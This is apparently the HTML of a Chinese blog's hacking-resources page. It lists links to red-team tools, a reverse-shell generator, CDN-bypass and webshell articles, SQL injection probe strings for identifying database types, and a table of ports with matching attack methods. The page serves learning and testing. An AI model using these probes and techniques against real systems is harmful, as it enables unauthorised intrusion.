@@ -1,0 +1,456 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>暗链 | 矢幽武博客</title><meta name="author" content="矢幽武"><meta name="copyright" content="矢幽武"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="日常发布资源的地方      a {         text-decoration: none;     }  日常座右铭 即使再小的帆也能远航。只要学不死，就往死里学！   真正的明白：知道老师要告诉我们什么，学完后能做什么事情 认认大神老师B站狂神   目录     靶场     杂记     Hack     源码收集-灰     解密相关资源     密码学     Web安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="暗链">
+<meta property="og:url" content="http://example.com/hack/index.html">
+<meta property="og:site_name" content="矢幽武博客">
+<meta property="og:description" content="日常发布资源的地方      a {         text-decoration: none;     }  日常座右铭 即使再小的帆也能远航。只要学不死，就往死里学！   真正的明白：知道老师要告诉我们什么，学完后能做什么事情 认认大神老师B站狂神   目录     靶场     杂记     Hack     源码收集-灰     解密相关资源     密码学     Web安全">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/backgroude/b11.jpg">
+<meta property="article:published_time" content="2023-04-11T12:33:24.000Z">
+<meta property="article:modified_time" content="2023-08-03T16:41:56.593Z">
+<meta property="article:author" content="矢幽武">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/backgroude/b11.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/hack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '暗链',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-08-04 00:41:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('/img/default_top_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="矢幽武博客"><span class="site-name">矢幽武博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资源</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/hack/"><i class="fa-fw fas fa-keyboard"></i><span> 暗链</span></a></li><li><a class="site-page child" href="/beout/"><i class="fa-fw fa fa-camera-retro"></i><span> 杂社</span></a></li><li><a class="site-page child" href="/target/"><i class="fa-fw fas fa-crosshairs"></i><span> 目标</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">暗链</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><p>日常发布资源的地方</p>
+<style>
+    a {
+        text-decoration: none;
+    }
+</style>
+<h1 id="日常座右铭"><a href="#日常座右铭" class="headerlink" title="日常座右铭"></a>日常座右铭</h1><blockquote>
+<p>即使再小的帆也能远航。<br>只要学不死，就往死里学！</p>
+</blockquote>
+<hr>
+<p>真正的明白：知道老师要告诉我们什么，学完后能做什么事情</p>
+<h1 id="认认大神老师"><a href="#认认大神老师" class="headerlink" title="认认大神老师"></a>认认大神老师</h1><p><a target="_blank" rel="noopener" href="https://space.bilibili.com/95256449">B站狂神</a></p>
+<hr>
+
+<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
+    <li><a href="#a0">靶场</a></li>
+    <li><a href="#a1">杂记</a></li>
+    <li><a href="#a2">Hack</a></li>
+    <li><a href="#a21">源码收集-灰</a></li>
+    <li><a href="#a3">解密相关资源</a></li>
+    <li><a href="#a4">密码学</a></li>
+    <li><a href="#a5">Web安全</a></li>
+    <li><a href="#a6">工具</a></li>
+    <li><a href="#a7">指纹识别</a></li>
+    <li><a href="#a8">漏洞</a></li>
+    <li><a href="#a9">字典</a></li>
+    <li><a href="#a10">模板注入</a></li>
+
+</ul>
+
+<div id="a2"></div>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><a target="_blank" rel="noopener" href="https://labs.hexingxing.cn/ns/">网站DNS记录查询</a></p>
+<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alashan12/article/details/124229559">docker搭建dvwa</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">上述搭建完成靶场后，使用下面语句运行即可</span><br><span class="line">docker run -d -p <span class="number">81</span>:<span class="number">80</span> d9c</span><br></pre></td></tr></table></figure>
+
+<div id="a1"></div>
+
+<h1 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h1><p><a target="_blank" rel="noopener" href="https://fontawesome.com.cn/faicons/">图标库</a>==<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">Win镜像下载</a>==<a target="_blank" rel="noopener" href="http://www.xmsj.org/">免费音乐站点推荐</a>==<a target="_blank" rel="noopener" href="https://www.cnblogs.com/DobbyBlog/p/15520508.html#:~:text=%E4%BA%8C%E3%80%81Centos%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B%201%20%E6%96%B9%E6%B3%95%E4%B8%80%20%EF%BC%9A%20%E5%90%8E%E9%9D%A2%E7%9A%84%E2%80%93trusted-host%20%E6%98%AF%E6%8C%87%E8%AE%BE%E7%BD%AE%E4%B8%BA%E5%8F%97%E4%BF%A1%E6%BA%90%EF%BC%8C%E5%90%A6%E5%88%99%E5%9C%A8%E5%AE%89%E5%85%A8%E6%80%A7%E8%BE%83%E9%AB%98%E7%9A%84%E8%BF%9E%E6%8E%A5%E4%B8%8B%E6%98%AF%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8A%E7%9A%84%20%E4%BB%A5%E5%AE%89%E8%A3%85%20pandas,cd%20.pip%20%E7%BC%96%E8%BE%91%E6%96%87%E4%BB%B6pip.conf%28%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BA%29%20vim%20pip.conf%20%E6%8A%8A%E4%B8%8B%E8%BE%B9%E7%9A%84%E5%A4%8D%E5%88%B6%E8%BF%9B%E5%8E%BB%20%28%E6%88%91%E7%94%A8%E7%9A%84%E6%B8%85%E5%8D%8E%E7%9A%84%E6%BA%90%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%83%B3%E9%85%8D%E7%BD%AE%E5%85%B6%E4%BB%96%E6%BA%90%E5%8F%AA%E9%9C%80%E8%A6%81%E6%94%B9%E4%B8%8B%E8%BE%B9%E7%9A%84%E5%86%85%E5%AE%B9%E5%8D%B3%E5%8F%AF%29%20">PIP换源</a></p>
+<div id="a2"></div>
+
+<h1 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h1><p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool">红队兵工厂/武器库</a><br><a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?tools">棱角社区</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43303273/article/details/83029138">渗透测试各个计算机系统的命令</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语</a><br><a target="_blank" rel="noopener" href="https://attack.mitre.org/">ATTC&amp;CK-专业名词阐释</a><br><a target="_blank" rel="noopener" href="https://forum.ywhack.com/reverse-shell/">反弹shell生成</a><br><a target="_blank" rel="noopener" href="https://site.ip138.com/">查出对应域名相关的IP及地址</a><br><a target="_blank" rel="noopener" href="https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">端口协议安全</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/268246.html">fofa语法</a></p>
+<div id="a21"></div>
+
+<h1 id="源码收集-灰"><a href="#源码收集-灰" class="headerlink" title="源码收集-灰"></a>源码收集-灰</h1><p><a target="_blank" rel="noopener" href="https://www.huzhan.com/">https://www.huzhan.com/</a><br><a target="_blank" rel="noopener" href="https://28xin.com/">https://28xin.com/</a><br><a target="_blank" rel="noopener" href="https://bbs.bcb5.com/">https://bbs.bcb5.com/</a><br><a target="_blank" rel="noopener" href="https://www.shixinwl.com/">https://www.shixinwl.com/</a><br><a target="_blank" rel="noopener" href="https://www.lengcat.com/">https://www.lengcat.com/</a><br><a target="_blank" rel="noopener" href="https://www.xlymz.com/">https://www.xlymz.com/</a><br><a target="_blank" rel="noopener" href="https://www.ymadx.com/">https://www.ymadx.com/</a></p>
+<div id="a3"></div>
+
+<h1 id="黑暗引擎："><a href="#黑暗引擎：" class="headerlink" title="黑暗引擎："></a>黑暗引擎：</h1><p><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a><br><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn</a><br><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io</a><br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
+<h1 id="自动项目："><a href="#自动项目：" class="headerlink" title="自动项目："></a>自动项目：</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a><br><a target="_blank" rel="noopener" href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a><br><a target="_blank" rel="noopener" href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
+<h1 id="相关资源："><a href="#相关资源：" class="headerlink" title="相关资源："></a>相关资源：</h1><p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p>
+<h1 id="解密相关资源"><a href="#解密相关资源" class="headerlink" title="解密相关资源"></a>解密相关资源</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://www.cmd5.com</span><br><span class="line">http://tmxk.org/jother</span><br><span class="line">http://www.jsfuck.com</span><br><span class="line">http://www.hiencode.com</span><br><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">https://utf-8.jp/public/aaencode.html</span><br><span class="line">https://github.com/guyoung/CaptfEncoder</span><br></pre></td></tr></table></figure>
+
+<div id="a4"></div>
+
+<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结（建议收藏）</a><br><a target="_blank" rel="noopener" href="http://www.jsfuck.com/">JS方括号括号特殊字符加密解密</a><br><a target="_blank" rel="noopener" href="http://www.hiencode.com/">CTF在线工具</a><br><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5加密解密工具</a><br><a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptaes">各种各样的加密解密工具</a><br><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/kaomoji.html">颜文字加密解密1</a><a target="_blank" rel="noopener" href="https://utf-8.jp/public/aaencode.html">颜文字加密解密2</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析（建议收藏）</a></p>
+<div id="a5"></div>
+
+<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV13c411V7dY/?spm_id_from=333.337.search-card.all.click&vd_source=da8bde9e491841fd2322285d1d7d5f19">B站大佬解OSCP</a></p>
+<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bluestorm/p/10345334.html">DNS域名解析</a><br><a target="_blank" rel="noopener" href="https://ping.chinaz.com/">超级ping网站</a>:获取最近的CDN节点。<br><a target="_blank" rel="noopener" href="http://17ce.com/">各地ping</a>—-<a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">国外ping</a>–<a target="_blank" rel="noopener" href="https://get-site-ip.com/">国外获取真实IP地址的站点(不一定正确)</a>—<a target="_blank" rel="noopener" href="https://github.com/Tai7sy/fuckcdn">全网扫描</a><br><a target="_blank" rel="noopener" href="https://ip138.com/">本机IP地址查询以及出网IP地址查询</a>—<a target="_blank" rel="noopener" href="https://webscan.cc/">旁注查询</a>—<a target="_blank" rel="noopener" href="https://dns.aizhan.com/">IP地址反查</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/111testing/p/13620931.html">TCPdump-抓包相关</a><br><a target="_blank" rel="noopener" href="https://liuyixiang.com/post/100290.html">常见端口渗透</a>–<a target="_blank" rel="noopener" href="https://www.se7ensec.cn/2018/11/28/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/">端口渗透测试总结</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/charon1937/p/13799467.html">看图识WAF</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33440472">绕过CDN总结</a>–<a target="_blank" rel="noopener" href="https://www.cnblogs.com/blacksunny/p/5771827.html">绕过CDN方法2</a><br><a target="_blank" rel="noopener" href="https://github.com/ja9er/go_proxy_pool">免费IP代理池</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41680234/article/details/106559703">万能密码大全</a><br><a target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/">sqlmap用户手册</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">转自：https:<span class="comment">//www.jianshu.com/p/995f57e36918</span></span><br><span class="line">SQL注入之注入点判断数据库类型</span><br><span class="line"><span class="number">0x01</span>：MSSQL</span><br><span class="line">    ID=<span class="number">1</span><span class="keyword">and</span>(<span class="title function_ invoke__">selectcount</span>(*)fromsysobjects)&gt;<span class="number">0</span>返回正常</span><br><span class="line">    ID=<span class="number">1</span><span class="keyword">and</span>(<span class="title function_ invoke__">selectcount</span>(*)frommsysobjects)&gt;<span class="number">0</span>返回异常</span><br><span class="line">    ID=<span class="number">1</span>andleft(<span class="title function_ invoke__">version</span>(),<span class="number">1</span>)=<span class="number">5</span>%<span class="number">23</span><span class="comment">//红色字体也可能是4</span></span><br><span class="line">    ID=<span class="number">1</span>andexists(selectidfromsysobjects)</span><br><span class="line">    ID=<span class="number">1</span>andlength(user)&gt;<span class="number">0</span></span><br><span class="line">    ID=<span class="number">1</span>CHAR(<span class="number">97</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">110</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">100</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">32</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">49</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">61</span>) +<span class="title function_ invoke__">CHAR</span>(<span class="number">49</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x02</span>：ACCESS</span><br><span class="line">    ID=<span class="number">1</span><span class="keyword">and</span>(<span class="title function_ invoke__">selectcount</span>(*)fromsysobjects)&gt;<span class="number">0</span>返回异常</span><br><span class="line">    ID=<span class="number">1</span><span class="keyword">and</span>(<span class="title function_ invoke__">selectcount</span>(*)frommsysobjects)&gt;<span class="number">0</span>返回异常</span><br><span class="line"></span><br><span class="line"><span class="number">0x03</span>：MYSQL</span><br><span class="line">    id=<span class="number">2</span>andversion()&gt;<span class="number">0</span>返回正常</span><br><span class="line">    id=<span class="number">2</span>andlength(<span class="title function_ invoke__">user</span>())&gt;<span class="number">0</span></span><br><span class="line">    id=<span class="number">2</span>CHAR(<span class="number">97</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">61</span>,<span class="number">49</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x04</span>：ORACLE</span><br><span class="line">    ID=<span class="number">1</span><span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;11</span></span><br><span class="line"><span class="string">    ID=1and0&lt;&gt;(selectcount(*)fromdual)</span></span><br><span class="line"><span class="string">    ID=1CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x05：其他方法</span></span><br><span class="line"><span class="string">    “/*”是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符：</span></span><br><span class="line"><span class="string">    “--”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：</span></span><br><span class="line"><span class="string">    “;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见端口和服务"><a href="#常见端口和服务" class="headerlink" title="常见端口和服务"></a>常见端口和服务</h3><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>说明</th>
+<th>攻击方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21</td>
+<td>FTP-文件传输协议</td>
+<td>弱口令、爆破、嗅探、后门</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh-安全隧道远程登陆</td>
+<td>弱口令、爆破</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet-远程连接</td>
+<td>弱口令、爆破、嗅探</td>
+</tr>
+<tr>
+<td>25</td>
+<td>smtp-简单邮件传输协议</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>53</td>
+<td>domain-DNS域名解析服务</td>
+<td>DNS劫持、缓存投毒</td>
+</tr>
+<tr>
+<td>80/443</td>
+<td>http服务</td>
+<td>常见Web漏洞、IIS写文件、OpenSSL</td>
+</tr>
+<tr>
+<td>139</td>
+<td>Samba服务</td>
+<td>爆破、远程代码执行</td>
+</tr>
+<tr>
+<td>445</td>
+<td>局域网共享</td>
+<td>ms-17010漏洞(Win7及之前版本)</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync</td>
+<td>远程代码执行</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL数据库</td>
+<td>爆破、SQL注入</td>
+</tr>
+<tr>
+<td>2049</td>
+<td>NFS</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL数据库</td>
+<td>爆破、SQL注入</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>rdp-远程桌面连接</td>
+<td>爆破、漏洞ms12-020等</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>postgresql</td>
+<td>爆破、注入</td>
+</tr>
+<tr>
+<td>5632</td>
+<td>Pcanywhere</td>
+<td>拒绝服务等漏洞、爆破</td>
+</tr>
+<tr>
+<td>5900</td>
+<td>VNC远程登陆</td>
+<td>爆破、认证绕过</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>7001/7002</td>
+<td>weblogic</td>
+<td>Java反序列化漏洞</td>
+</tr>
+<tr>
+<td>9990</td>
+<td>jboss</td>
+<td>远程代码执行、Java反序列化</td>
+</tr>
+</tbody></table>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs">红日安全-PHP</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/blacksunny/p/8060028.html">数据库load_file()读取操作</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/8902444.html">突破secure-file-priv写shell</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">SQL注入</a></p>
